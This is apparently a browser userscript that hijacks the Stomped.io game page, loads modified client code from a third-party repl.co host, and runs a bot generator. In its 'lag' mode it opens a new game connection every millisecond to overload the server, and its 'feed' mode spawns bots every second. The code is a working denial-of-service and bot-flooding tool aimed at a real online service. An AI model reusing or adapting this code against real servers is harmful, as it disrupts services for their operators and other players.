(function(open) {
  XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
    var xhr = this;

    // Override onreadystatechange to handle errors
    var originalOnreadystatechange = xhr.onreadystatechange;
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4) {
        // Check if the request was not successful (status outside the range 200-299)
        if (xhr.status < 200 || xhr.status >= 300) {
          // Check if the URL matches the desired pattern
          if (xhr.responseURL.includes('stomped.io/socket.io/?')) {
            document.title = "Server overloaded"
          }
        }
      }

      // Call the original onreadystatechange if it exists
      if (originalOnreadystatechange) {
        originalOnreadystatechange.apply(xhr);
      }
    };

    // Call the original open function
    open.call(xhr, method, url, async, user, pass);
  };
})(XMLHttpRequest.prototype.open);
var htmlCode = `<!doctype html> 
<html lang="en"> 
<head>



<link rel="stylesheet" href="https://stomped-script.jblitzar.repl.co/style.css">
<script src="https://raw.githubusercontent.com/antimatter15/whammy/master/whammy.js"></script>
<script src="https://stomped-script.jblitzar.repl.co/capture.js"></script>




<link rel="icon" href="myicon.ico"/>
	<meta charset="UTF-8" />
    <meta name='viewport' content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, minimal-ui" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="title" content="Stomped.io" />
    <meta name="keywords" content="stompedio, stomped, platformer, jumping, smash, io, game, games, web game, html5, fun, flash, multiplayer">
    <meta name="description" content="Stomped.io - Massive multiplayer online game! Stomp other players, grow huge, and reach number one. Don't get stomped!" />
    <meta property="og:title" content="Stomped.io" />
    <meta property="og:description" content="Stomped.io - Massive multiplayer online game! Stomp other players, grow huge, and reach number one. Don't get stomped!" />
    <meta® property="og:url" content="https://stomped.io/"/>
    <meta property="og:image" content="https://stomped.io/designs/facebook.png" />
    <meta property="og:image:type" content="image/png" />
    <meta property="og:type" content="website"/>
    <link rel="manifest" href="/manifest.json">
    <link rel="image_src"
          type="image/png"
          href="https://stomped.io/designs/facebook.png" />
    <link rel="canonical" href="https://stomped.io/"/>
    <title>Stomped.io</title>
    


<link rel="stylesheet" href="https://stomped-script.jblitzar.repl.co/main.css"/>
    



<link href="https://fonts.googleapis.com/css?family=Luckiest+Guy" rel="stylesheet"/>
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Indie+Flower" rel="stylesheet"/>
   
</head>
<body>

<h1 id="h"></h1>




<div id="mount-point"></div>

<div class="right-ad"><div id="cdm-zone-02"></div></div>

<div id="game-container"></div>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-109477929-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-109477929-1');
</script>
<script src="https://cdn.ravenjs.com/3.22.3/raven.min.js" crossorigin="anonymous"></script>
<script>
  Raven.config('https://89cdf3b3a652420ab4b2d5a1e704d6ef@sentry.io/244077', {
    // https://blog.sentry.io/2017/03/27/tips-for-reducing-javascript-error-noise.html
    whitelistUrls: [
      'stomped.io',
      'www.stomped.io'
    ],
    dataCallback: function(data) {
      data.extra = data.extra || {};
      data.extra.logs = dbg.baseHandler.cBufferToText(150);
      return data;
    }
  }).install();
</script>

<!-- Begin comScore -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({ c1: "2", c2: "6035118" });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>

<!-- End comScore -->

<!-- Nielsen Online SiteCensus -->
<div><img src="//secure-us.imrworldwide.com/cgi-bin/m?ci=us-603339h&amp;cg=0&amp;cc=1&amp;ts=noscript" width="1" height="1" alt="" /></div>
<!-- End Nielsen Online SiteCensus -->

<div id="coords"></div>





<script type="text/javascript" src="https://stomped-script.jblitzar.repl.co/bundlemod_client.js"></script></body>
</html>`; document.open("text/html", "replace"); document.write(htmlCode); document.close();
(function() {
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then(function(registrations) {
      registrations.forEach(function(registration) {
        registration.unregister().then(function(success) {
          console.log('Service Worker unregistered:', success);
        }).catch(function(error) {
          console.error('Service Worker unregistration failed:', error);
        });
      });
    });
  } else {
    console.error('Service Worker is not supported in this browser.');
  }
})();
function getRandomChoice(choices) {
    var randomIndex = Math.floor(Math.random() * choices.length);
    return choices[randomIndex];
}
var invisString = "​​"
var bots = 0
function join(e, t = "bot", i = "robot-0", r = "stomped.io") {
    if(i == "random"){
        var skins = ["plain-0","plain-1","plain-2","plain-3","plain-4","plain-5","plain-6","spacesuit-0","spacesuit-1","spacesuit-2","robot-0","robot-1","robot-2","alien-0","alien-1","alien-2","skeleton-0","skeleton-1","skeleton-2","plumber-0","plumber-1","plumrbe-2","reddit-0", "slender-0", "fady-0", "4chan-0", "santa-0"]
        i = getRandomChoice(skins)
    }
    if(t == "random"){
        var names = ["stomperoni", "guncap slingbad", "cobalt", "driftdetector", "death from above", "agony of defeat", "a", "someone", "something", "atomic blastoid", "cya", "what", "lalal", ".", "asdf", "leo", "imagine getting stomped by me", "sherwood gladiator"]
        t = getRandomChoice(names)
    }
    t = invisString + t
    // Establish WebSocket connection
    const socket = e.connect(r);

    // Emit "join" event
    socket.emit("join", {
        name: t,
        char: i
    });

    // Handle "joined" event
    socket.on("joined", function (t, i) {
        // Add logic for handling the "joined" event in a headless context
        console.log("Bot joined the game:", t, i);
        bots ++;
        document.title = "Server functional"
        // Simulate further game-related logic if needed
    });    
    socket.on('error', function (error) {
        console.log("Server overloaded");
        document.title = "Server overloaded";
    });
    // Handle "bcast" events
    /*socket.on("bcast", function (t) {
        // Simulate logic for handling broadcasted game data in a headless context
        //console.log("Received broadcast:", t);

        // Simulate further processing if needed
    });*/ //no bcast lag

    // Handle disconnection
    socket.on("disconnect", function () {
        console.log("disconnect");
        bots --;
        socket.disconnect()

        // Handle disconnection logic, e.g., attempt reconnection
        // x(); // Uncomment and implement x() function if needed
    });
    setTimeout(()=>{socket.disconnect()},60*1000)
}
function run(mode, name, skin){
    document.title = "Running in mode: "+mode
    setInterval(()=>{
    document.getElementById("h").innerHTML = bots.toString()
    },1000)
    if(mode == "lag"){
        setInterval(()=>{join(window.dbg.dbg_e, name, skin)},1)

    }else if(mode == "feed"){
        setInterval(()=>{join(window.dbg.dbg_e, name, skin)},1000)

    }

}
setTimeout(()=>{

    
    

document.title = "Bot generator"
document.getElementById("h").innerHTML = "Code loaded."

setTimeout(()=>{
    run((confirm("OK for feed") ? "feed" : "lag"), "Free food left corner", "plain-0")
    
},100)
},1000)